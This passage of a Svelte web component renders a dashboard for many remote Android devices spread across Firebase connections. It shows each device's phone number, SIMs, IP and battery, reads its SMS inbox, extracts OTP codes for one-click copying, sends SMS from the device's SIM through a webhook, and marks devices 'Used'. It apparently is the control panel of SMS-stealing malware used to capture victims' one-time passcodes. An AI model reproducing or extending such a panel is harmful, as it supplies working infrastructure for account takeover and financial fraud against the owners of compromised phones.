              {#each filteredTableDevices.slice(devicePage*DEVICES_PER_PAGE, (devicePage+1)*DEVICES_PER_PAGE) as d (d.connId+'::'+d.key)}
                {@const on     = d.info ? isOnline(d.info) : null}
                {@const bat    = d.info ? getBattery(d.info) : null}
                {@const fp     = getDisplayPhone(d.connId, d.key, d.info)}
                {@const sc     = d.info ? getSims(d.info) : null}
                {@const isNew  = newDeviceKeys.has(`${d.connId}::${d.key}`)}
                {@const devUsed = isUsed(`dev::${d.connId}::${d.key}`)}
                <div class="dev-card {selectedKey===d.key&&selectedConnId===d.connId?'dev-card-sel':''} {devUsed?'dev-card-used':''}"
                     onclick={() => selectDevice(d.connId, d.key)}
                     role="button" tabindex="0"
                     onkeydown={e => e.key==='Enter' && selectDevice(d.connId, d.key)}
                     aria-label="Select device {d.key}">
                  <!-- Left accent bar (Firebase color) -->
                  <span class="dev-card-bar" style="background:{d.conn.color}"></span>
                  <!-- Status dot -->
                  <span class="td-dot {on===true?'ton':on===false?'toff':'tunk'} dev-card-dot"></span>
                  <!-- Main content -->
                  <div class="dev-card-body">
                    <!-- Device ID row -->
                    <div class="dev-card-id-row">
                      <span class="mono dev-card-id">{d.key.slice(0,16)}{d.key.length>16?'…':''}</span>
                      {#if isNew}<span class="td-new">NEW</span>{/if}
                      <button class="icon-btn-xs" title="Copy device ID" aria-label="Copy device ID"
                        onclick={e => { e.stopPropagation(); copyText(d.key); toast('Device ID copied','success'); }}>
                        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      </button>
                    </div>
                    <!-- Phone + SIM row -->
                    <div class="dev-card-sub">
                      {#if fp}
                        <span class="dev-card-phone">{fp}</span>
                        <button class="icon-btn-xs" title="Copy number" aria-label="Copy phone number"
                          onclick={e => { e.stopPropagation(); copyText(fp); toast('Number copied','success'); }}>
                          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                        </button>
                      {:else}
                        <span class="dev-card-no-num">{d.conn.name}</span>
                      {/if}
                      {#if sc}<span class="dev-card-sim">{sc}S</span>{/if}
                    </div>
                  </div>
                  <!-- Right: battery + arrow -->
                  <div class="dev-card-right">
                    {#if bat !== null}
                      <span class="dev-card-bat" style="background:{batColor(bat)}15;color:{batColor(bat)};border:1px solid {batColor(bat)}44">{bat}%</span>
                    {/if}
                    <svg class="dev-card-arrow" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
                  </div>
                </div>
              {/each}
              {#if filteredTableDevices.length === 0}
                <div class="dt-empty">No devices match the selected filters</div>
              {/if}
            </div>
          </div>
          <!-- Bottom pagination bar — always visible -->
          <div class="pag-bar">
            <div class="pag-group-left">
              <span class="pag-summary">
                Showing <strong>{filteredTableDevices.length === 0 ? 0 : devicePage * DEVICES_PER_PAGE + 1}–{Math.min((devicePage + 1) * DEVICES_PER_PAGE, filteredTableDevices.length)}</strong> of <strong>{filteredTableDevices.length}</strong>
              </span>
            </div>
            <div class="pag-group-controls">
              <button class="pag-btn pag-btn-nav" disabled={devicePage === 0} onclick={() => setDevicePage(0)} aria-label="First page" title="First page">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="11 17 6 12 11 7" /><polyline points="18 17 13 12 18 7" /></svg>
                <span class="pag-btn-txt">First</span>
              </button>
              <button class="pag-btn pag-btn-nav" disabled={devicePage === 0} onclick={() => setDevicePage(devicePage - 1)} aria-label="Previous page" title="Previous page">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6" /></svg>
                <span class="pag-btn-txt">Prev</span>
              </button>
              <div class="pag-nums">
                {#if totalDevicePages <= 7}
                  {#each Array(totalDevicePages) as _, idx}
                    <button class="pag-btn pag-num {devicePage === idx ? 'active' : ''}" onclick={() => setDevicePage(idx)} aria-label="Page {idx + 1}" aria-current={devicePage === idx ? "page" : undefined}>
                      {idx + 1}
                    </button>
                  {/each}
                {:else}
                  <span class="pag-info-badge">
                    Page <strong>{devicePage + 1}</strong> / <strong>{totalDevicePages}</strong>
                  </span>
                {/if}
              </div>
              <button class="pag-btn pag-btn-nav" disabled={devicePage >= totalDevicePages - 1} onclick={() => setDevicePage(devicePage + 1)} aria-label="Next page" title="Next page">
                <span class="pag-btn-txt">Next</span>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6" /></svg>
              </button>
              <button class="pag-btn pag-btn-nav" disabled={devicePage >= totalDevicePages - 1} onclick={() => setDevicePage(totalDevicePages - 1)} aria-label="Last page" title="Last page">
                <span class="pag-btn-txt">Last</span>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="13 17 18 12 13 7" /><polyline points="6 17 11 12 6 7" /></svg>
              </button>
            </div>
          </div>
        </div>

      <!-- ── DEVICE ────────────────────────────────────────────────────── -->
      {:else if activeTab === 'device'}
        {#if !selectedKey}
          <div class="no-sel">Select a device from the sidebar</div>
        {:else}
          {@const on  = selectedInfo ? isOnline(selectedInfo) : null}
          {@const bat = selectedInfo ? getBattery(selectedInfo) : null}

          <!-- Device header -->
          <div class="dv-card">
            <div class="dv-left">
              <div class="dv-ico">
                <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" opacity="0.7">
                  <rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/>
                </svg>
              </div>
              <div>
                <div class="dv-id mono">{selectedKey}</div>
                <div style="display:flex;gap:8px;align-items:center;margin-top:6px;flex-wrap:wrap">
                  {#if on !== null}
                    <span class="ob {on?'ob-on':'ob-off'}">{on?'Online':'Offline'}</span>
                  {:else}
                    <span class="ob ob-unk">No device info</span>
                  {/if}
                  {#if selectedConn}
                    <span style="font-size:12px;color:{selectedConn.color}">· {selectedConn.name}</span>
                  {/if}
                </div>
              </div>
            </div>
            {#if bat !== null}
              <div class="dv-bat">
                <div class="dv-bat-n" style="color:{batColor(bat)}">{bat}%</div>
                <div class="dv-bat-l">BATTERY</div>
                <div class="bat-track"><div class="bat-fill" style="width:{bat}%;background:{batColor(bat)}"></div></div>
              </div>
            {/if}
          </div>

          <!-- Info grid -->
          {@const dispPhone = getDisplayPhone(selectedConnId, selectedKey, selectedInfo)}
          {#if selectedInfo || dispPhone}
            <div class="info-grid">
              <div class="ib">
                <div class="ib-l">PHONE</div>
                {#if editingPhone && editingPhone.connId===selectedConnId && editingPhone.key===selectedKey}
                  <div class="phone-edit-row">
                    <input class="phone-edit-in" bind:value={editPhoneVal}
                      placeholder="e.g. Jio +919764912687"
                      onkeydown={e => e.key==='Enter' && commitPhone()}
                      aria-label="Phone number"/>
                    <button class="btn btn-primary btn-sm" onclick={commitPhone}>Save</button>
                    <button class="btn btn-ghost btn-sm" onclick={() => editingPhone=null}>✕</button>
                  </div>
                {:else}
                  <div class="ib-v" style="display:flex;align-items:center;gap:6px;flex-wrap:wrap">
                    <span>{dispPhone??'—'}</span>
                    {#if dispPhone}
                      <button class="af-cp" onclick={() => { const n=extractNumber(dispPhone); copyText(n); toast(`Copied: ${n}`,'success'); }} title="Copy 10-digit number" aria-label="Copy number">
                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      </button>
                    {/if}
                    <button class="edit-ph-btn" onclick={() => startEditPhone(selectedConnId, selectedKey)} title="Edit local number" aria-label="Edit phone">
                      {dispPhone ? '✏️' : '+ Add number'}
                    </button>
                  </div>
                {/if}
              </div>
              <div class="ib"><div class="ib-l">IP</div><div class="ib-v mono">{selectedInfo?getIp(selectedInfo)??'—':'—'}</div></div>
              <div class="ib"><div class="ib-l">ANDROID</div><div class="ib-v">{selectedInfo?getAndroid(selectedInfo)??'—':'—'}</div></div>
              <div class="ib"><div class="ib-l">SIMS</div><div class="ib-v">{selectedInfo?getSims(selectedInfo)??0:0}</div></div>
            </div>
          {:else}
            <div class="info-grid">
              <div class="ib">
                <div class="ib-l">PHONE</div>
                {#if editingPhone && editingPhone.connId===selectedConnId && editingPhone.key===selectedKey}
                  <div class="phone-edit-row">
                    <input class="phone-edit-in" bind:value={editPhoneVal}
                      placeholder="e.g. Jio +919764912687"
                      onkeydown={e => e.key==='Enter' && commitPhone()}
                      aria-label="Phone number"/>
                    <button class="btn btn-primary btn-sm" onclick={commitPhone}>Save</button>
                    <button class="btn btn-ghost btn-sm" onclick={() => editingPhone=null}>✕</button>
                  </div>
                {:else}
                  <div class="ib-v">
                    <button class="edit-ph-btn add-ph" onclick={() => startEditPhone(selectedConnId, selectedKey)}>+ Add local number</button>
                  </div>
                {/if}
              </div>
              <div class="ib"><div class="ib-l">IP</div><div class="ib-v" style="color:#334155">—</div></div>
              <div class="ib"><div class="ib-l">ANDROID</div><div class="ib-v" style="color:#334155">—</div></div>
              <div class="ib"><div class="ib-l">SIMS</div><div class="ib-v" style="color:#334155">—</div></div>
            </div>
          {/if}

          <!-- Action buttons + device used toggle -->
          {@const devUsedDetail = isUsed(`dev::${selectedConnId}::${selectedKey}`)}
          <div class="act-row">
            <button class="act-btn ab-msg" onclick={() => switchTab('messages')}>
              💬 Messages
            </button>
            <button class="act-btn ab-snd" onclick={() => switchTab('send')}>
              🚀 Send
            </button>
          </div>

          <!-- Device used checkbox -->
          <div class="dev-used-row">
            <label class="dev-used-label" for="dev-used-chk">
              <input id="dev-used-chk" type="checkbox" class="dev-check" checked={devUsedDetail}
                onchange={() => toggleUsed(`dev::${selectedConnId}::${selectedKey}`)}
                aria-label="Mark device used"/>
              <span>{devUsedDetail ? '✓ Marked as Used' : 'Mark as Used'}</span>
            </label>
          </div>
        {/if}

      <!-- ── MESSAGES ───────────────────────────────────────────────────── -->
      {:else if activeTab === 'messages'}
        {#if !selectedKey}
          <div class="no-sel">Select a device first</div>
        {:else if msgsLoading}
          <div class="no-sel"><div class="spin-ring"></div><p>Loading messages…</p></div>
        {:else if msgs === null}
          <div class="no-sel">
            <p>Click to load messages for <code class="mono">{selectedKey}</code></p>
            <button class="btn btn-primary" onclick={loadMessages}>Load Messages</button>
          </div>
        {:else}
          <div class="msg-topbar">
            <span class="msg-count">{filteredMsgs.length} / 50 messages</span>
            <div class="msg-search-wrap">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" opacity="0.4"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
              <input class="msg-search" bind:value={msgsSearch} placeholder="Search messages…" aria-label="Search messages"/>
            </div>
            <div class="msg-tabs">
              <button class="mtab {msgsFilter==='all'?'mta':''}" onclick={() => msgsFilter='all'}>All</button>
              <button class="mtab {msgsFilter==='in'?'mti':''}"  onclick={() => msgsFilter='in'}>In</button>
              <button class="mtab {msgsFilter==='out'?'mto':''}" onclick={() => msgsFilter='out'}>Out</button>
            </div>
            <button class="btn btn-ghost btn-sm" onclick={loadMessages}>↻</button>
          </div>

          {#if filteredMsgs.length === 0}
            <div class="no-sel" style="min-height:200px">
              <p style="color:#475569">No messages found{msgsSearch||msgsFilter!=='all'?' for this filter':''}</p>
            </div>
          {:else}
            <div class="msg-list">
              {#each filteredMsgs as [id, msg]}
                {@const msgText = msg.message??msg.body??msg.text??''}
                {@const otp = extractOTP(msgText)}
                <div class="msg-card">
                  <div class="mc-row">
                    <span class="mc-sender">{msg.sender??msg.from??'Unknown'}</span>
                    <span class="mc-badge {(msg.type||'incoming')==='incoming'?'badge-in':'badge-out'}">
                      {(msg.type||'incoming')==='incoming'?'Incoming':'Outgoing'}
                    </span>
                  </div>
                  <div class="mc-body">{msgText.slice(0, 80)}{msgText.length > 80 ? '…' : ''}</div>
                  {#if otp}
                    <div class="mc-otp" role="button" tabindex="0"
                      onclick={() => { copyText(otp); toast(`OTP ${otp} copied!`, 'success'); }}
                      onkeydown={e => e.key==='Enter' && (copyText(otp), toast(`OTP ${otp} copied!`,'success'))}
                      title="Click to copy OTP">
                      <span class="otp-label">OTP</span>
                      <code class="otp-code">{otp}</code>
                      <span class="otp-copy-hint">
                        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      </span>
                    </div>
                  {/if}
                  <div class="mc-foot">
                    {#if msg.dateTime}<span class="mc-dt">{toIST(msg.dateTime)}</span>{/if}
                    <button class="af-cp" onclick={() => copyText(msgText)} title="Copy full message" aria-label="Copy message">
                      <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                    </button>
                  </div>
                </div>
              {/each}
            </div>
          {/if}
        {/if}

      <!-- ── SEND SMS ───────────────────────────────────────────────────── -->
      {:else if activeTab === 'send'}
        {#if !selectedKey}
          <div class="no-sel">Select a device first</div>
        {:else}
          <div class="send-wrap">
            <div class="send-hdr">Send SMS</div>
            <div class="send-sub">via <span style="color:{selectedConn?.color}">{selectedConn?.name}</span> → <code class="mono">{selectedKey}</code></div>
            <div class="send-sub" style="margin-top:2px;font-size:10.5px;color:#475569;word-break:break-all;">
              📍 <code style="font-size:10px;color:#64748b">{selectedConn?.url}/clients/{selectedKey}/webhookEvent/sendSms</code>
            </div>
            <div class="send-form">
              <div class="field">
                <label for="sms-to">To (phone number)</label>
                <input id="sms-to" bind:value={smsDraft.to} placeholder="+91 XXXXX XXXXX"/>
              </div>
              <div class="field">
                <label for="sms-sim">SIM Slot</label>
                <select id="sms-sim" bind:value={smsDraft.sim} class="tiny-sel" style="font-size:13px;padding:8px 10px;">
                  <option value="0">SIM 1 (Slot 0)</option>
                  <option value="1">SIM 2 (Slot 1)</option>
                </select>
              </div>
              <div class="field">
                <label for="sms-msg">Message</label>
                <textarea id="sms-msg" rows="5" bind:value={smsDraft.body} placeholder="Type your message…"></textarea>
              </div>
              <button class="act-btn ab-snd" onclick={doSendSMS} disabled={smsSending||!smsDraft.to.trim()||!smsDraft.body.trim()}>
                {#if smsSending}<span class="spin-ring" style="width:14px;height:14px;border-width:2px"></span>
                {:else}🚀 Send SMS{/if}
              </button>
            </div>
          </div>
        {/if}
      {/if}
    </div>
  </div>
</div>




<!-- Toasts -->
<div class="toast-stack">
  {#each toasts as t (t.id)}
    <div class="toast {t.type} {t.out?'out':''}">{t.msg}</div>
  {/each}
</div>

<!-- Mobile Bottom Navigation Bar -->
<nav class="bottom-nav" aria-label="Main navigation">
  <button class="bn-item {activeBottomTab==='dashboard'?'bn-active':''}"
    onclick={() => setBottomTab('dashboard')}
    aria-label="Dashboard" aria-current={activeBottomTab==='dashboard'?'page':undefined}>
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/>
      <rect x="14" y="14" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/>
    </svg>
    <span class="bn-label">Dashboard</span>
  </button>
  <button class="bn-item {activeBottomTab==='devices'?'bn-active':''}"
    onclick={() => setBottomTab('devices')}
    aria-label="Devices" aria-current={activeBottomTab==='devices'?'page':undefined}>
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/>
    </svg>
    <span class="bn-label">Devices</span>
  </button>
  {#if showNotifsTab}
    <!-- Notifications bell with badge -->
    <button class="bn-item {showBellPanel?'bn-active':''} bn-notif-wrap"
      onclick={() => setBottomTab('notifs')}
      aria-label="Notifications">
      <div style="position:relative;display:inline-flex">
        {#if notifsEnabled}
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
        {:else}
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/><line x1="2" y1="2" x2="22" y2="22"/></svg>
        {/if}
        {#if notifications.length > 0}
          <span class="bn-notif-badge">{notifications.length > 9 ? '9+' : notifications.length}</span>
        {/if}
      </div>
      <span class="bn-label">{notifsEnabled ? 'Alerts' : 'Muted'}</span>
    </button>
  {/if}
  <button class="bn-item {activeBottomTab==='send'?'bn-active':''}"
    onclick={() => setBottomTab('send')}
    aria-label="Send SMS" aria-current={activeBottomTab==='send'?'page':undefined}>
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/>
    </svg>
    <span class="bn-label">Send</span>
  </button>
  <button class="bn-item {activeBottomTab==='settings'?'bn-active':''}"
    onclick={() => setBottomTab('settings')}
    aria-label="Settings" aria-current={activeBottomTab==='settings'?'page':undefined}>
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <circle cx="12" cy="12" r="3"/>
      <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
    </svg>
    <span class="bn-label">Settings</span>
  </button>
</nav>


<style>
  * { box-sizing: border-box; }
  :global(html, body) {
    margin: 0;
    padding: 0;
    height: 100%;
    overflow: hidden;
  }
  .shell { display:flex; height:100vh; height:100dvh; overflow:hidden; background:#0b0e17; color:#e2e8f0; font-family:'Inter',system-ui,sans-serif; }

  /* ── SIDEBAR ─────────────────────────────────────────────────────────── */
  .sidebar { width:220px; flex-shrink:0; background:#0e1420; border-right:1px solid rgba(255,255,255,0.07); display:flex; flex-direction:column; height:100vh; overflow:hidden; }

  .side-brand { display:flex; align-items:center; gap:8px; padding:14px 14px 10px; border-bottom:1px solid rgba(255,255,255,0.06); flex-shrink:0; }
  .brand-txt { font-size:16px; font-weight:800; color:#f97316; letter-spacing:0.01em; }

  .side-search { display:flex; align-items:center; gap:6px; margin:8px 10px 4px; padding:7px 10px; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.07); border-radius:6px; flex-shrink:0; }
  .search-in { background:none; border:none; outline:none; font-size:12px; color:#e2e8f0; width:100%; font-family:inherit; }
  .search-in::placeholder { color:#475569; }

  .side-filter { display:flex; gap:3px; padding:0 10px 5px; flex-shrink:0; flex-wrap:wrap; }
  .filt { flex:1; min-width:0; padding:4px 3px; border-radius:5px; border:1px solid rgba(255,255,255,0.08); background:transparent; color:#64748b; font-size:11px; font-weight:600; cursor:pointer; font-family:inherit; transition:all 120ms; white-space:nowrap; }
  .filt:hover { color:#94a3b8; }
  .fa { background:#f97316!important; color:#fff!important; border-color:#f97316!important; }
  .fo { background:rgba(34,197,94,.18)!important; color:#22c55e!important; border-color:rgba(34,197,94,.4)!important; }
  .fx { background:rgba(239,68,68,.14)!important; color:#ef4444!important; border-color:rgba(239,68,68,.3)!important; }
  .fn { background:rgba(56,189,248,.15)!important; color:#38bdf8!important; border-color:rgba(56,189,248,.35)!important; }
  .fu { background:rgba(167,139,250,.15)!important; color:#a78bfa!important; border-color:rgba(167,139,250,.35)!important; }

  .dev-list { flex:1; overflow-y:auto; }
  .dev-list::-webkit-scrollbar { width:3px; }
  .dev-list::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.09); border-radius:99px; }

  .dev-item { display:flex; align-items:center; justify-content:space-between; padding:8px 10px 8px 12px; cursor:pointer; border-left:3px solid transparent; transition:background 80ms,border-color 80ms; }
  .dev-item:hover { background:rgba(255,255,255,0.04); }
  .dev-item.selected { background:rgba(249,115,22,0.09); border-left-color:#f97316; }
  .di-left { display:flex; align-items:center; gap:8px; min-width:0; flex:1; }
  .di-right { display:flex; align-items:center; gap:5px; flex-shrink:0; }
  .dev-check { width:13px; height:13px; accent-color:#f97316; cursor:pointer; flex-shrink:0; }
  .dev-used { opacity:0.45; }
    .dot { width:7px; height:7px; border-radius:50%; flex-shrink:0; }
  .dot-on  { background:#22c55e; box-shadow:0 0 5px rgba(34,197,94,.6); }
  .dot-off { background:#2d3748; }
  .dot-unk { background:#1e2a3a; border:1px solid #334155; }
  .di-id { font-size:11.5px; font-weight:600; color:#e2e8f0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
  .di-sub { font-size:10px; color:#64748b; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; margin-top:1px; }
  .bat-pill { font-size:11px; font-weight:700; padding:2px 6px; border-radius:4px; border:1px solid; flex-shrink:0; font-family:'JetBrains Mono',monospace; }
  .load-more { width:100%; padding:8px; font-size:11px; color:#f97316; background:none; border:none; border-top:1px solid rgba(255,255,255,0.05); cursor:pointer; font-family:inherit; transition:background 120ms; }
  .load-more:hover { background:rgba(249,115,22,0.06); }
  .list-empty { padding:20px; text-align:center; font-size:12px; color:#334155; }

  .side-footer { border-top:1px solid rgba(255,255,255,0.07); padding:8px 10px; flex-shrink:0; }
  .sf-hdr { font-size:9px; font-weight:700; text-transform:uppercase; letter-spacing:0.1em; color:#334155; margin-bottom:5px; }
  .conn-scroll {
    max-height: calc(22px * 10 + 5px); /* 10 rows max */
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: thin;
    scrollbar-color: rgba(255,255,255,0.1) transparent;
    user-select: none;
  }
  .conn-scroll::-webkit-scrollbar { width:3px; }
  .conn-scroll::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.12); border-radius:3px; }
  .conn-row { display:flex; align-items:center; gap:5px; padding:3px 2px; }
  .cr-dot { width:6px; height:6px; border-radius:50%; flex-shrink:0; }
  .cr-name { font-size:11px; color:#94a3b8; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
  .cr-cnt { font-size:10px; font-weight:700; font-family:'JetBrains Mono',monospace; }
  .cr-status { display:flex; align-items:center; gap:3px; flex-shrink:0; }
  .cr-on-dot { width:5px; height:5px; border-radius:50%; flex-shrink:0; }
  .cr-tog { width:26px; height:14px; border-radius:7px; border:none; cursor:pointer; position:relative; transition:background 200ms; flex-shrink:0; }
  .cr-tog.ton  { background:#f97316; }
  .cr-tog.toff { background:#1e293b; border:1px solid #334155; }
  .cr-knob { position:absolute; top:1px; width:12px; height:12px; background:white; border-radius:50%; transition:left 200ms; }
  .cr-tog.ton  .cr-knob { left:13px; }
  .cr-tog.toff .cr-knob { left:1px; }
  .cr-rm { background:none; border:none; color:#475569; font-size:15px; cursor:pointer; width:18px; height:18px; display:flex; align-items:center; justify-content:center; border-radius:3px; padding:0; font-family:inherit; transition:all 120ms; line-height:1; }
  .cr-rm:hover { color:#ef4444; background:rgba(239,68,68,0.1); }
  .add-fb-btn { display:flex; align-items:center; gap:6px; width:100%; margin-top:8px; padding:7px 8px; border-radius:6px; border:1px dashed rgba(249,115,22,0.3); background:transparent; color:#f97316; font-size:11.5px; font-weight:600; cursor:pointer; font-family:inherit; transition:all 140ms; }
  .add-fb-btn:hover { background:rgba(249,115,22,0.08); border-color:#f97316; }

  /* ── MAIN ────────────────────────────────────────────────────────────── */
  .main { flex:1; display:flex; flex-direction:column; min-width:0; min-height:0; height:100%; overflow:hidden; }

  .topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:44px; background:#0e1420; border-bottom:1px solid rgba(255,255,255,0.07); flex-shrink:0; gap:10px; }
  .tb-l { display:flex; align-items:center; gap:10px; min-width:0; }
  .refresh-cd { font-size:11px; color:#334155; font-family:'JetBrains Mono',monospace; }
  .bg-refresh { display:flex; align-items:center; gap:5px; color:#34d399; }
  .bg-dot { width:6px; height:6px; border-radius:50%; background:#34d399; display:inline-block; animation:bg-pulse 1.2s ease-in-out infinite; box-shadow:0 0 6px rgba(52,211,153,0.7); }
  @keyframes bg-pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.7)} }
  .tb-r { display:flex; align-items:center; gap:8px; flex-shrink:0; }
  .tbstat { font-size:12px; font-weight:700; padding:3px 10px; border-radius:20px; white-space:nowrap; }
  .tt { background:rgba(255,255,255,0.06); color:#94a3b8; border:1px solid rgba(255,255,255,0.1); }
  .to { background:rgba(34,197,94,0.14); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
  .tf { background:rgba(239,68,68,0.1); color:#ef4444; border:1px solid rgba(239,68,68,0.25); }
  .ico-btn { width:30px; height:30px; display:flex; align-items:center; justify-content:center; border-radius:6px; border:1px solid rgba(255,255,255,0.1); background:rgba(255,255,255,0.04); color:#64748b; cursor:pointer; transition:all 140ms; font-family:inherit; }
  .ico-btn:hover { color:#e2e8f0; border-color:rgba(255,255,255,0.2); background:rgba(255,255,255,0.08); }
  .ico-active { color:#f97316!important; border-color:rgba(249,115,22,0.4)!important; background:rgba(249,115,22,0.08)!important; }
  .ico-muted  { color:#ef4444!important; border-color:rgba(239,68,68,0.35)!important; background:rgba(239,68,68,0.08)!important; }
  .notif-clear-btn { display:flex; align-items:center; gap:3px; width:auto!important; padding:0 8px!important; color:#f97316!important; border-color:rgba(249,115,22,0.35)!important; }

  .add-panel { background:#0e1420; border-bottom:1px solid rgba(255,255,255,0.07); padding:14px 20px; flex-shrink:0; }
  .ap-hdr { display:flex; align-items:center; justify-content:space-between; margin-bottom:10px; font-size:13px; font-weight:600; }
  .ap-grid { display:grid; grid-template-columns:1fr 2fr 1fr 1fr 1fr; gap:10px; }
  .ap-foot { display:flex; justify-content:flex-end; gap:8px; margin-top:10px; }

  .raw-drawer { background:#0a0d16; border-bottom:1px solid rgba(255,255,255,0.07); padding:12px 20px; display:flex; flex-direction:column; gap:10px; flex-shrink:0; max-height:40vh; overflow-y:auto; }
  .rd-top { display:flex; align-items:center; gap:10px; }
  .rd-lbl { font-size:10px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; color:#64748b; flex:1; }
  .rd-row { display:flex; gap:8px; align-items:center; }
  .method-sel { font-family:'JetBrains Mono',monospace; font-size:12px; font-weight:700; color:#f97316; background:#0d1117; border:1px solid rgba(255,255,255,0.1); border-radius:5px; padding:7px 8px; cursor:pointer; outline:none; }
  .rd-path { flex:1; font-family:'JetBrains Mono',monospace; font-size:12px; }
  .s-pill { display:inline-flex; font-size:11px; font-weight:600; padding:2px 8px; border-radius:4px; }
  .sp-ok  { background:rgba(34,197,94,0.12); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
  .sp-err { background:rgba(239,68,68,0.1); color:#ef4444; border:1px solid rgba(239,68,68,0.25); }
  .tiny-sel { background:#0d1117; border:1px solid rgba(255,255,255,0.1); border-radius:5px; padding:5px 8px; font-size:12px; color:#e2e8f0; cursor:pointer; outline:none; font-family:inherit; }

  .tab-bar { display:flex; background:#0e1420; border-bottom:2px solid rgba(255,255,255,0.07); flex-shrink:0; padding:0 18px; gap:2px; }
  .tab { padding:10px 18px; font-size:13px; font-weight:500; color:#64748b; background:none; border:none; border-bottom:2px solid transparent; margin-bottom:-2px; cursor:pointer; font-family:inherit; transition:all 130ms; white-space:nowrap; }
  .tab:hover:not(:disabled) { color:#94a3b8; }
  .tab.active { color:#f97316; border-bottom-color:#f97316; }
  .tab:disabled { opacity:.3; cursor:not-allowed; }

  .tab-body {
    flex: 1;
    overflow-y: auto;
    overflow-x: hidden;
    -webkit-overflow-scrolling: touch;
    overscroll-behavior-y: contain;
    padding: 18px 22px 40px;
    display: flex;
    flex-direction: column;
    gap: 14px;
    min-height: 0;
  }
  .tab-body::-webkit-scrollbar { width:5px; }
  .tab-body::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.09); border-radius:99px; }

    .tab-body-overview {
    overflow: hidden !important;
    padding: 12px 18px 12px;
    gap: 10px;
    height: 100%;
